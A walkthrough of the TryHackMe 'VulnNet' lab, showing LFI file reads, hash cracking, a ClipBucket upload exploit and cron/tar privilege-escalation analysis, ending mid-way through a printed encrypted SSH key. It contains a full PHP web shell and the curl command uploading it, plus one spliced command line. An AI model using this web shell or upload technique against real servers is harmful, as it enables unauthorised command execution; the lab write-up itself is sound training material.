---
layout: default
title: "TryHackMe: VulnNet Writeup"
date: 2026-11-20 12:00:00 +0100
categories: [CTF, TryHackMe]
tags: [lfi, subdomain, cve, script_analysis, wildcard, crontab]
---

# VulnNet (Medium) - TryHackMe Walkthrough

VulnNet is a medium room available on [TryHackMe](https://tryhackme.com/room/vulnnet1). The machine requires a basic understanding of LFI, subdomain enumeration, CVE, script analysis, Linux crontab, and wildcard abuse.

# Enumeration

After adding `vulnnet.thm` to `/etc/hosts` file, as suggested from the room introduction, I proceeded with a network ports scan using `rustscan`.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ rustscan -a $TARGET -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where '404 Not Found' meets '200 OK'.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.114.150.123:22
Open 10.114.150.123:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 10.114.150.123
...

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwkZ4lon+5ZNgVQmItwLRcbDT9QrJJGvPrfqsbAnwk4dgPz1GDjIg+RwRIZIwPGRPpyvd01W1vh0BNs7Uh9f5RVuojlLxjqsN1876Jvt5Ma7ajC49lzxmtI8B5Vmwxx9cRA8JBvENm0+BTsDjpaj3JWllRffhD25Az/F1Tz3fSua1GiR7R2eEKSMrD38+QGG22AlrCNHvunCJkPmYH9LObHq9uSZ5PbJmqR3Yl3SJarCZ6zsKBG5Ka/xJL17QUB5o6ZRHgpw/pmw+JKWUkodIwPe4hCVH0dQkfVAATjlx9JXH95h4EPmKPvZuqHZyGUPE5jPiaNg6YCNCtexw5Wo41
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA8L+SEmXtvfURdTRsmhaay/VJTFJzXYlU/0uKlPAtdpyZ8qaI55EQYPwcPMIbvyYtZM37Bypg0Uf7Sa8i1aTKk=
|   256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKNuqHl39hJpIduBG9J7QwetpgO1PWQSUDL/rvjXPiWw
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VulnNet
|_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496
...
```

## HTTP (80)

The website landing page is showed below.

![image.png](/assets/images/thm-vulnnet/image.png)

The website also presented a login page. Default credentials like `admin:admin` or `admin:password` did not work.

![image.png](/assets/images/thm-vulnnet/image%201.png)

The first thing I tried, was a directory bruteforce to discover if there was any interesting endpoint.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ ffuf -u http://vulnnet.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt     

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.3.0
________________________________________________

 :: Method           : GET
 :: URL              : http://vulnnet.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 29ms]
fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 28ms]
img                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 29ms]
index.php               [Status: 200, Size: 5829, Words: 1689, Lines: 142, Duration: 29ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 29ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 5912ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 5912ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 5987ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 29ms]
:: Progress: [4750/4750] :: Job [1/1] :: 1369 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

I also tried a subdomain enumeration, and discovered a protected `broadcast` subdomain.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ ffuf -u http://vulnnet.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.vulnnet.thm" -fs 5829

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.3.0
________________________________________________

 :: Method           : GET
 :: URL              : http://vulnnet.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.vulnnet.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5829
________________________________________________

broadcast               [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 29ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1315 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

![image.png](/assets/images/thm-vulnnet/image%202.png)

Again, default credentials like `admin:admin` and `admin:password` did not work. 

I decided to inspect the javascript files found in the `/js` endpoint, because of their suspicious names.  

![image.png](/assets/images/thm-vulnnet/image%203.png)

![image.png](/assets/images/thm-vulnnet/image%204.png)

I used a JavaScript [online beautifier](https://beautifier.io/) to read the code more easily. On the first file, I found a reference to `broadcast` subdomain (already discovered during previous subdomain enumeration), while on the second one I found an interesting `?referer=` argument passed to `index.php`. I tested for command execution and LFI, the second option worked.

![image.png](/assets/images/thm-vulnnet/image%205.png)

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ curl http://vulnnet.thm/index.php?referer=/etc/passwd 
<!doctype html>
<html lang="en">
...

</div>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
        <script src="/js/index__7ed54732.js"></script>
        <script src="/js/index__d8338055.js"></script>

</body>
</html>
```

The /etc/passwd file revealed a `server-management` user (uid 1000). I tried to bruteforce passwords for this user on both `broadcast` and `/login.html`, but did not work, so I continued fuzzing with the `referer` parameter to discover some other interesting file.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ ffuf -u http://vulnnet.thm/index.php?referer=FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -fs 5829

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.3.0
________________________________________________

 :: Method           : GET
 :: URL              : http://vulnnet.thm/index.php?referer=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5829
________________________________________________

login.html              [Status: 200, Size: 8308, Words: 2321, Lines: 211, Duration: 30ms]
index.php               [Status: 200, Size: 0, Words: 0, Lines: 0, Duration: 0ms]
LICENSE.txt             [Status: 200, Size: 6938, Words: 1896, Lines: 167, Duration: 3977ms]
:: Progress: [37050/37050] :: Job [1/1] :: 1298 req/sec :: Duration: [0:00:59] :: Errors: 0 ::
```

I tried to inspect `index.php` directly from `referer` parameter, but this crashed the Firefox window because of an infinite page loading loop. I inspected the code directly from `/var/www/html` (default Apache2 web directory) but found nothing interesting, so I continue with bruteforce, this time with a specific Linux LFI wordlist.

```bash
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ ffuf -u "http://vulnnet.thm/index.php?referer=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 5829

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.3.0
________________________________________________

 :: Method           : GET
 :: URL              : http://vulnnet.thm/index.php?referer=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5829
________________________________________________

/etc/fstab              [Status: 200, Size: 6292, Words: 1756, Lines: 152, Duration: 32ms]
/etc/anacrontab         [Status: 200, Size: 6230, Words: 1710, Lines: 155, Duration: 34ms]
/etc/apache2/apache2.conf [Status: 200, Size: 13053, Words: 2630, Lines: 369, Duration: 34ms]
/etc/lsb-release        [Status: 200, Size: 5932, Words: 1691, Lines: 146, Duration: 29ms]
/etc/mtab               [Status: 200, Size: 8350, Words: 1859, Lines: 176, Duration: 29ms]
/etc/networks           [Status: 200, Size: 5920, Words: 1699, Lines: 144, Duration: 29ms]
/etc/mysql/my.cnf       [Status: 200, Size: 6511, Words: 1777, Lines: 163, Duration: 29ms]
/etc/network/interfaces [Status: 200, Size: 5919, Words: 1701, Lines: 146, Duration: 30ms]
/etc/profile            [Status: 200, Size: 6410, Words: 1833, Lines: 169, Duration: 31ms]
/etc/resolv.conf        [Status: 200, Size: 6567, Words: 1785, Lines: 160, Duration: 29ms]
/etc/ssh/ssh_config     [Status: 200, Size: 7409, Words: 1936, Lines: 193, Duration: 29ms]
/etc/ssh/sshd_config    [Status: 200, Size: 9093, Words: 1982, Lines: 264, Duration: 30ms]
/proc/cpuinfo           [Status: 200, Size: 6770, Words: 1806, Lines: 169, Duration: 916ms]
/proc/filesystems       [Status: 200, Size: 6212, Words: 1689, Lines: 174, Duration: 916ms]
/etc/apache2/.htpasswd  [Status: 200, Size: 5878, Words: 1689, Lines: 143, Duration: 1135ms]
/proc/mounts            [Status: 200, Size: 8350, Words: 1859, Lines: 176, Duration: 31ms]
/proc/meminfo           [Status: 200, Size: 7136, Words: 2161, Lines: 189, Duration: 31ms]
/proc/modules           [Status: 200, Size: 7487, Words: 1854, Lines: 175, Duration: 31ms]
/proc/ioports           [Status: 200, Size: 6772, Words: 1869, Lines: 180, Duration: 31ms]
/proc/version           [Status: 200, Size: 5982, Words: 1705, Lines: 143, Duration: 31ms]
/proc/self/net/arp      [Status: 200, Size: 6216, Words: 1869, Lines: 147, Duration: 31ms]
/proc/interrupts        [Status: 200, Size: 7552, Words: 2361, Lines: 181, Duration: 33ms]
/proc/stat              [Status: 200, Size: 7992, Words: 2679, Lines: 151, Duration: 33ms]
/proc/swaps             [Status: 200, Size: 5866, Words: 1689, Lines: 143, Duration: 34ms]
/var/log/faillog        [Status: 200, Size: 37861, Words: 1689, Lines: 142, Duration: 29ms]
/var/log/lastlog        [Status: 200, Size: 298121, Words: 1689, Lines: 142, Duration: 32ms]
/var/run/utmp           [Status: 200, Size: 7365, Words: 1689, Lines: 142, Duration: 30ms]
/etc/adduser.conf       [Status: 200, Size: 8857, Words: 2090, Lines: 230, Duration: 30ms]
/etc/apache2/envvars    [Status: 200, Size: 7611, Words: 1878, Lines: 189, Duration: 29ms]
/etc/apache2/mods-available/dir.conf [Status: 200, Size: 5986, Words: 1703, Lines: 147, Duration: 30ms]
/etc/apache2/mods-available/deflate.conf [Status: 200, Size: 6224, Words: 1711, Lines: 152, Duration: 30ms]
/etc/apache2/mods-available/autoindex.conf [Status: 200, Size: 9203, Words: 2001, Lines: 238, Duration: 29ms]
/etc/apache2/mods-available/mime.conf [Status: 200, Size: 13505, Words: 2631, Lines: 393, Duration: 29ms]
/etc/apache2/mods-available/setenvif.conf [Status: 200, Size: 7109, Words: 1801, Lines: 174, Duration: 29ms]
/etc/apache2/mods-available/ssl.conf [Status: 200, Size: 8939, Words: 2119, Lines: 227, Duration: 29ms]
/etc/apache2/mods-available/proxy.conf [Status: 200, Size: 6651, Words: 1812, Lines: 169, Duration: 30ms]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 6672, Words: 1803, Lines: 166, Duration: 29ms]
/etc/apache2/mods-enabled/deflate.conf [Status: 200, Size: 6224, Words: 1711, Lines: 152, Duration: 29ms]
/etc/apache2/mods-enabled/dir.conf [Status: 200, Size: 5986, Words: 1703, Lines: 147, Duration: 29ms]
/etc/apache2/mods-enabled/mime.conf [Status: 200, Size: 13505, Words: 2631, Lines: 393, Duration: 29ms]
/etc/apache2/mods-enabled/negotiation.conf [Status: 200, Size: 6553, Words: 1797, Lines: 162, Duration: 29ms]
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 6578, Words: 1770, Lines: 171, Duration: 28ms]
/etc/apache2/ports.conf [Status: 200, Size: 6149, Words: 1724, Lines: 157, Duration: 29ms]
/etc/avahi/avahi-daemon.conf [Status: 200, Size: 7582, Words: 1818, Lines: 210, Duration: 29ms]
/etc/bash.bashrc        [Status: 200, Size: 8148, Words: 2087, Lines: 213, Duration: 29ms]
/etc/bluetooth/input.conf [Status: 200, Size: 6226, Words: 1741, Lines: 155, Duration: 28ms]
/etc/bluetooth/main.conf [Status: 200, Size: 9699, Words: 2230, Lines: 231, Duration: 29ms]
/etc/bluetooth/network.conf [Status: 200, Size: 5949, Words: 1699, Lines: 148, Duration: 28ms]
/etc/ca-certificates.conf [Status: 200, Size: 11727, Words: 1752, Lines: 286, Duration: 29ms]
/etc/debconf.conf       [Status: 200, Size: 8798, Words: 2099, Lines: 225, Duration: 28ms]
/etc/debian_version     [Status: 200, Size: 5840, Words: 1689, Lines: 143, Duration: 29ms]
/etc/deluser.conf       [Status: 200, Size: 6433, Words: 1774, Lines: 162, Duration: 29ms]
/etc/default/grub       [Status: 200, Size: 7043, Words: 1831, Lines: 175, Duration: 29ms]
/etc/dhcp/dhclient.conf [Status: 200, Size: 7564, Words: 1856, Lines: 196, Duration: 28ms]
/etc/group              [Status: 200, Size: 6686, Words: 1689, Lines: 205, Duration: 28ms]
/etc/fuse.conf          [Status: 200, Size: 6109, Words: 1726, Lines: 150, Duration: 29ms]
/etc/group-             [Status: 200, Size: 6703, Words: 1689, Lines: 205, Duration: 30ms]
/etc/hdparm.conf        [Status: 200, Size: 10690, Words: 2414, Lines: 280, Duration: 29ms]
/etc/host.conf          [Status: 200, Size: 5921, Words: 1704, Lines: 145, Duration: 29ms]
/etc/hostname           [Status: 200, Size: 5837, Words: 1689, Lines: 143, Duration: 29ms]
/etc/issue.net          [Status: 200, Size: 5846, Words: 1691, Lines: 143, Duration: 29ms]
/etc/ld.so.conf         [Status: 200, Size: 5863, Words: 1690, Lines: 144, Duration: 29ms]
/etc/kernel-img.conf    [Status: 200, Size: 5973, Words: 1705, Lines: 148, Duration: 29ms]
/etc/ldap/ldap.conf     [Status: 200, Size: 6161, Words: 1711, Lines: 159, Duration: 30ms]
/etc/login.defs         [Status: 200, Size: 16379, Words: 3326, Lines: 483, Duration: 29ms]
/etc/logrotate.conf     [Status: 200, Size: 6532, Words: 1807, Lines: 178, Duration: 30ms]
/etc/ltrace.conf        [Status: 200, Size: 20696, Words: 2699, Lines: 685, Duration: 31ms]
/etc/manpath.config     [Status: 200, Size: 11003, Words: 2218, Lines: 273, Duration: 29ms]
/etc/modules            [Status: 200, Size: 6024, Words: 1721, Lines: 147, Duration: 29ms]
/etc/mtools.conf        [Status: 200, Size: 6453, Words: 1766, Lines: 167, Duration: 30ms]
/etc/os-release         [Status: 200, Size: 6211, Words: 1694, Lines: 154, Duration: 28ms]
/etc/pam.conf           [Status: 200, Size: 6381, Words: 1753, Lines: 157, Duration: 30ms]
/etc/passwd-            [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 30ms]
/etc/pulse/client.conf  [Status: 200, Size: 7030, Words: 1858, Lines: 177, Duration: 29ms]
/etc/security/access.conf [Status: 200, Size: 10449, Words: 2379, Lines: 264, Duration: 29ms]
/etc/security/group.conf [Status: 200, Size: 9464, Words: 2378, Lines: 248, Duration: 29ms]
/etc/security/limits.conf [Status: 200, Size: 7979, Words: 2434, Lines: 198, Duration: 28ms]
/etc/security/namespace.conf [Status: 200, Size: 7269, Words: 1907, Lines: 170, Duration: 31ms]
/etc/security/pam_env.conf [Status: 200, Size: 8801, Words: 2117, Lines: 215, Duration: 29ms]
/etc/security/sepermit.conf [Status: 200, Size: 6248, Words: 1794, Lines: 153, Duration: 29ms]
/etc/security/time.conf [Status: 200, Size: 8008, Words: 2030, Lines: 207, Duration: 29ms]
/etc/sensors3.conf      [Status: 200, Size: 16197, Words: 4271, Lines: 665, Duration: 30ms]
/etc/sysctl.conf        [Status: 200, Size: 8512, Words: 1965, Lines: 219, Duration: 29ms]
/etc/sysctl.d/10-console-messages.conf [Status: 200, Size: 5906, Words: 1701, Lines: 145, Duration: 30ms]
/etc/sysctl.d/10-network-security.conf [Status: 200, Size: 6338, Words: 1750, Lines: 154, Duration: 29ms]
/etc/timezone           [Status: 200, Size: 5843, Words: 1689, Lines: 143, Duration: 30ms]
/etc/updatedb.conf      [Status: 200, Size: 6232, Words: 1730, Lines: 146, Duration: 29ms]
/proc/net/tcp           [Status: 200, Size: 6879, Words: 2062, Lines: 149, Duration: 29ms]
/proc/devices           [Status: 200, Size: 6376, Words: 1787, Lines: 201, Duration: 30ms]
/proc/net/udp           [Status: 200, Size: 6469, Words: 1852, Lines: 147, Duration: 28ms]
/proc/self/cmdline      [Status: 200, Size: 5856, Words: 1689, Lines: 142, Duration: 28ms]
/proc/self/mounts       [Status: 200, Size: 8350, Words: 1859, Lines: 176, Duration: 29ms]
/proc/self/stat         [Status: 200, Size: 6146, Words: 1740, Lines: 143, Duration: 29ms]
/proc/self/status       [Status: 200, Size: 7130, Words: 1779, Lines: 196, Duration: 30ms]
/usr/share/adduser/adduser.conf [Status: 200, Size: 8857, Words: 2090, Lines: 230, Duration: 31ms]
/etc/passwd             [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 3566ms]
/etc/hosts.deny         [Status: 200, Size: 6540, Words: 1816, Lines: 159, Duration: 3567ms]
/etc/crontab            [Status: 200, Size: 6592, Words: 1797, Lines: 158, Duration: 3577ms]
/var/log/Xorg.0.log     [Status: 200, Size: 23395, Words: 4731, Lines: 417, Duration: 30ms]
/etc/hosts.allow        [Status: 200, Size: 6240, Words: 1770, Lines: 152, Duration: 4620ms]
/etc/issue              [Status: 200, Size: 5853, Words: 1693, Lines: 144, Duration: 4621ms]
/etc/hosts              [Status: 200, Size: 6060, Words: 1708, Lines: 150, Duration: 4620ms]
/etc/cups/cupsd.conf    [Status: 200, Size: 12232, Words: 2473, Lines: 328, Duration: 4621ms]
:: Progress: [881/881] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

The most interesting file is surely `/etc/apache2/.htpasswd`, which was retrieved without any permission error. 

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ curl http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd 
<!doctype html>
...

</div>

developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
        <script src="/js/index__7ed54732.js"></script>
        <script src="/js/index__d8338055.js"></script>

</body>
</html>
```

The file contained a username and a password hash, which I tried to crack using `hascat`.

```
┌──(giu㉿kali)-[~/Downloads/machine]
└─$ echo '$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0' > hash.txt

┌──(giu㉿kali)-[~/Downloads/machine]
└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode
...

┌──(giu㉿kali)-[~/Downloads/machine]
└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0:9972761drmfsls
```

With those credentials, I finally succeeded to access the `developer` subdomain, which showed a ClipBucket service.

![image.png](/assets/images/thm-vulnnet/image%206.png)

# Exploitation

The service version is leaked in the web page source code, so I tried to search for any existing exploits.

![image.png](/assets/images/thm-vulnnet/image%207.png)

```
┌──(kali㉿kali)-[~/Downloads/machine]
└─$ searchsploit clipbucket 4.0
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection                        | php/webapps/44250.txt
ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection                        | php/webapps/44250.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The exploit states that it works on ClipBucket version < 4.0, I tried to run it anyway.

I read and followed the exploit description from [ExploitDB](https://www.exploit-db.com/exploits/44250), successfully uploading a php reverse shell payload (direct command injection did not work for me).

![image.png](/assets/images/thm-vulnnet/image%208.png)

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

```
┌──(kali㉿kali)-[~/Downloads/machine]
└─$ nano shell.php 
                                                                                                                                             
┌──(kali㉿kali)-[~/Downloads/machine]
└─$ curl -F "file=@shell.php" -F "plupload=1" -F "name=anyname.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php" -u developers:9972761drmfsls
creating file{"success":"yes","file_name":"1795115255567922","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}
```

The server responded with a message containing the random file name selected for the shell and the endpoint.

![image.png](/assets/images/thm-vulnnet/image%209.png)

# Initial Access

After setting up a listener and sending a simple `netcat` payload through the uploaded php shell, I finally gained an initial access on target system as user `www-data`.

```
www-data@vulnnet:/var/www/html$ whoami
www-data
```

# PrivEsc

## Server-Management

From `crontab` file, I discovered an interesting `backupsrv.sh` script executed as `root` every 2 minutes.

The crontab PATH variable starts the search from `/usr/local/sbin`, so we cannot abuse the variable.

```
www-data@vulnnet:/var/www/html$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/2   * * * *   root    /var/opt/backupsrv.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

`www-data` user had no writing permission on the script, so I was not able to modify it. In addition, the script backs up files from `/home/server-management/Documents`, a directory to which I had no access.

```
www-data@vulnnet:/var/www/html$ ls -la /var/opt/backupsrv.sh 
-rwxr--r-- 1 root root 530 Jan 23  2021 /var/opt/backupsrv.sh
www-data@vulnnet:/var/www/html$ cat /var/opt/backupsrv.sh 
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

In the /var/backups there were already backed up files, so I tried to unzip them and discovered an `id_rsa` with read permission.

```
www-data@vulnnet:/var/www/html$ cd /var/backups/
www-data@vulnnet:/var/backups$ tar -xf vulnnet-Monday.tgz -C /tmp
www-data@vulnnet:/var/backups$ tar -xf vulnnet-Thursday.tgz -C /tmserver-management@vulnnet:~$ cd /tmp
www-data@vulnnet:/var/backups$ tar -xf ssh-backup.tar.gz -C /tmp
www-data@vulnnet:/var/backups$ cd /tmp
www-data@vulnnet:/tmp$ ls -la
total 84
drwxrwxrwt  2 root     root      4096 Nov 19 20:23  .
drwxr-xr-x 23 root     root      4096 Jan 23  2021  ..
-rw-r-----  1 www-data www-data 35144 Jan 23  2021 'Daily Job Progress Report Format.pdf'
-rw-r-----  1 www-data www-data 33612 Jan 23  2021 'Employee Search Progress Report.pdf'
-rw-------  1 www-data www-data  1766 Jan 24  2021  id_rsa
www-data@vulnnet:/tmp$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6CE1A97A7DAB4829FE59CC561FB2CCC4

mRFDRL15t7qvaZxJGHDJsewnhp7wESbEGxeAWtCrbeIVJbQIQd8Z8SKzpvTMFLtt
dseqsGtt8HSruVIq++PFpXRrBDG5F4rW5B6VDOVMk1O9J4eHEV0N7es+hZ22o2e9
60qqj7YkSY9jVj5Nqq49uUNUg0G0qnWh8M6r8r83Ov+HuChdeNC5CC2OutNivl7j
dmIaFRFVwmWNJUyVen1FYMaxE+NojcwsHMH8aV2FTiuMUsugOwZcMKhiRPTElojn
tDrlgNMnP6lMkQ6yyJEDNFtn7tTxl7tqdCIgB3aYQZXAfpQbbfJDns9EcZEkEkrp
